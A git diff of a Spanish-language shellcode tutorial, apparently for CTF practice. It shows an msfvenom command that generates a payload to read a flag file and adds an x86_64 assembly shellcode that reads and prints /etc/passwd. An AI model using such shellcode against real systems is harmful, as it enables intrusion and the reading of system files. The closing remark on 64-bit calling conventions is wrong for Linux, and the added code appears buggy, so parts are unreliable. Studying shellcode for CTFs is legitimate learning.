@@ -99,7 +99,7 @@ msfvenom -p linux/x64/exec CMD="cat /home/ctf/flag.txt" -n 16 -b '\x00\x20\x0d\x
 
 El shellcode no es más que los opcodes de las instrucciones de lenguaje ensamblador. Hagamos un ejemplo con el clásico "Hola mundo" en ensamblador:
 
-```
+```asm
 global _start
 
 section .text
@@ -127,7 +127,7 @@ MESSAGE:
 
 ```
 
-En este código se utiliza el clásico jmp-ret para dejar en la pila la dirección de memoria de la variable a la que queremos acceder. En este caso "Hello, World!". Está explicado este método en los comentarios. 
+En este código se utiliza el clásico jmp-call para dejar en la pila la dirección de memoria de la variable a la que queremos acceder. En este caso "Hello, World!". Está explicado este método en los comentarios. 
 
 
 #####¿Cómo se genera?
@@ -209,6 +209,59 @@ int main(int argc, char **argv)
 gcc test.c -o test
 ./test
 Hello wolrd!
+```
+
+#####Ejemplo leer fichero en 64 bits
+
+Veamos como se construye el shellcode para leer el fichero /etc/passwd en un entorno x86_64 linux. Si tenemos este código de ensamblador:
+
+```asm
+global _start
+
+section .text
+
+_start:
+jmp short _push_filename
+
+_readfile:
+; syscall open file (const char *filename, int flags, int mode)
+; $rax=2 (sys_open); $rdi= puntero_a_nombre_fichero; $rsi=0 (read_only); $rdx=0644o (flags)
+pop rdi ; puntero_a_nombre_fichero
+xor rax, rax
+add al, 2   ; set sys_open 
+xor rsi, rsi ; set O_RDONLY flag
+syscall
+; en $rax nos devuelve el fd que apunta al fichero abierto
+
+; syscall read file (unsigned int fd, char *buf, size_t count)
+; $rax=0(sys_read); $rdi= $rax(fd) ; $rsi= puntero_a_memoria ; $rdx=0xfff(número de bytes a leer)
+sub sp, 0xfff
+lea rsi, [rsp]  ; $rsi = puntero a memoria donde vamos a guardar lo que leemos
+mov rdi, rax    ; $rdi = fd devuelto en la syscall anterior
+xor rdx, rdx
+mov dx, 0xfff   ; $rdx = cantidad de bytes a leer
+xor rax, rax    ; $rax = sys_read (0)
+syscall
+; $rax = bytes leídos
+
+; syscall write to stdout (sys_write, unsigned int fd, const char *buf, size_t count)
+; $rax=1(sys_write); $rdi= 0x1 (pantalla) ; $rsi= puntero_a_memoria ; $rdx= $rax (bytes leídos en el anterior syscall)
+xor rdi, rdi
+add dil, 1  ; set stdout fd = 1 (screen)
+mov rdx, rax    ; bytes leídos en el anterior syscall
+xor rax, rax
+add al, 1   ; $rax = sys_write (1)
+syscall
+
+; syscall exit (int error_code=60) 
+xor rax, rax
+add al, 60  ; $rax = sys_exit (60)
+syscall
+
+_push_filename:
+call _readfile
+path: db "/etc/passwd"
+
 ```
 
 Estoy probando esto mismo con 64 bits para un programa en ensamblador que lea el /etc/passwd, de momento me da "Segmentation fault", cuando consiga resolverlo lo colgaré aquí para ver un ejemplo en 64 bits. Creo que tiene que ver en como se pasan los parámetros en 64 bits, que no utiliza la pila (los primeros 4 parámetros van en los registros RCX, RDX, R8, R9, el resto se pasan por la pila).
